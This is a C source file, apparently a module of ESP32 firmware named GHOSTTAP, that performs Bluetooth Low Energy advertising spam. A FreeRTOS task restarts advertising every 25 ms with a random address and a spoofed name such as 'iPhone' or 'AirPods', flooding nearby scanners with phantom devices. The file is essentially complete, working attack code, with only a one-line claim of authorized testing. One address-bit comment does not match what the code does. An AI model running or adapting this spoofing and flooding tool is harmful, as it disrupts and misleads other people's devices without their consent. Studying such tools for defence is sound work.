/*
 * GHOSTTAP BLE advertising spam.
 *
 * Rapidly restarts non-connectable advertising with a fresh random
 * address and a randomly chosen device name every ~25 ms.  Nearby
 * scanners collect a pile of phantom devices.  Uses the shared NimBLE
 * host (ble_core).  BLE vs 802.15.4 exclusivity is enforced by the
 * caller (UI / command layer).
 *
 * This firmware is for authorized security testing only.
 */
#include <stdlib.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_log.h"
#include "esp_random.h"

#include "modules/ble_core.h"
#include "modules/ble_spam.h"

static const char *TAG = "ble_spam";

#if CONFIG_BT_ENABLED && CONFIG_BT_NIMBLE_ENABLED
#include "host/ble_gap.h"
#include "host/ble_hs.h"
#include "host/ble_hs_adv.h"
#include "host/util/util.h"

#define SPAM_PERIOD_MS   25
#define ADV_ITVL         0x20   /* 20 ms, the spec minimum */

static const char *const s_names[BLE_SPAM_MAX_NAMES] = {
    "iPhone", "Galaxy", "AirPods", "Fitbit", "Bose QC", "JBL Flip",
    "Mi Band", "Garmin", "Xbox", "Switch", "SmartTag", "Tile",
    "GHOSTTAP", "Wifi-5G", "GuestNet", "Printer",
};

static volatile bool s_running;
static TaskHandle_t  s_task;
static uint32_t      s_packets;
static uint32_t      s_name_switches;
static char          s_last_name[33];

static void make_random_addr(uint8_t rnd[6])
{
    esp_fill_random(rnd, 6);
    rnd[0] = (rnd[0] & 0x3f) | 0x80;   /* random bit = 1 */
    rnd[5] = (rnd[5] & 0x7f) | 0xc0;   /* top two bits '10' -> random static */
}

static void pick_name(char *out, size_t len)
{
    snprintf(out, len, "%s %02u",
             s_names[esp_random() % BLE_SPAM_MAX_NAMES],
             (unsigned)(esp_random() % 100));
}

static void set_fields(const char *name)
{
    struct ble_hs_adv_fields fields;
    memset(&fields, 0, sizeof(fields));
    fields.flags = BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP;
    fields.name = (uint8_t *)name;
    fields.name_len = strlen(name);
    fields.name_is_complete = 1;
    ble_gap_adv_set_fields(&fields);
}

static void spam_task(void *arg)
{
    struct ble_gap_adv_params adv = {
        .conn_mode = BLE_GAP_CONN_MODE_NON,     /* non-connectable */
        .disc_mode = BLE_GAP_DISC_MODE_GEN,
        .itvl_min = ADV_ITVL,
        .itvl_max = ADV_ITVL,
        .channel_map = 0x07,
    };

    uint8_t rnd[6];
    char    name[33];

    while (s_running) {
        pick_name(name, sizeof(name));
        make_random_addr(rnd);

        if (ble_hs_id_set_rnd(rnd) == 0) {
            set_fields(name);
            if (ble_gap_adv_start(BLE_OWN_ADDR_RANDOM, NULL, 0,
                                  &adv, NULL, NULL) == 0) {
                /* ~1 packet per 20 ms interval; count the window */
                s_packets += 1;
                s_name_switches++;
                snprintf(s_last_name, sizeof(s_last_name), "%s", name);
                vTaskDelay(pdMS_TO_TICKS(SPAM_PERIOD_MS));
                ble_gap_adv_stop();
            }
        }
        vTaskDelay(pdMS_TO_TICKS(2));
    }

    ble_gap_adv_stop();
    vTaskDelete(NULL);
}

esp_err_t ble_spam_start(void)
{
    if (s_running) return ESP_ERR_INVALID_STATE;
    ESP_ERROR_CHECK(ble_core_init());
    if (ble_core_wait_sync(3000) != ESP_OK) {
        ESP_LOGW(TAG, "host not synced");
        return ESP_ERR_TIMEOUT;
    }

    s_packets = 0;
    s_name_switches = 0;
    s_last_name[0] = 0;
    s_running = true;
    xTaskCreate(spam_task, "ble_spam", 3072, NULL, 5, &s_task);
    ESP_LOGI(TAG, "BLE spam started");
    return ESP_OK;
}

esp_err_t ble_spam_stop(void)
{
    if (!s_running) return ESP_OK;
    s_running = false;
    if (s_task) {
        vTaskDelay(pdMS_TO_TICKS(40));
        s_task = NULL;
    }
    ESP_LOGI(TAG, "BLE spam stopped");
    return ESP_OK;
}

bool ble_spam_is_running(void) { return s_running; }

void ble_spam_get_stats(uint32_t *packets, uint32_t *names,
                        char *last_name, size_t namelen)
{
    if (packets) *packets = s_packets;
    if (names)   *names = s_name_switches;
    if (last_name && namelen) snprintf(last_name, namelen, "%s", s_last_name);
}

#else /* BT disabled -> stubs */

esp_err_t ble_spam_start(void)              { return ESP_ERR_NOT_SUPPORTED; }
esp_err_t ble_spam_stop(void)               { return ESP_OK; }
bool ble_spam_is_running(void)              { return false; }
void ble_spam_get_stats(uint32_t *p, uint32_t *n, char *ln, size_t l)
{
    if (p) *p = 0;
    if (n) *n = 0;
    if (ln && l) ln[0] = 0;
}

#endif
